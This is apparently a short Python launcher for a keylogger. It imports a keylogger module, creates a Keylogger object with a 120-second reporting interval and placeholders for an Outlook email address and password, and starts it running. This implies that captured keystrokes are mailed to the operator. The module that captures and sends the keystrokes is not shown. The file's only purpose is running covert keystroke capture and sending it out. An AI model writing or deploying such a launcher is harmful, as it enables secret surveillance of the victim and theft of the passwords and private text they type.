#!/usr/bin/env python
#importing the Keylogger file 
import keylogger
# object creation 
my_keylogger = keylogger.Keylogger(120, "enter your outlook mail id ", "enter your password")
#starting the threading funcion
my_keylogger.start()
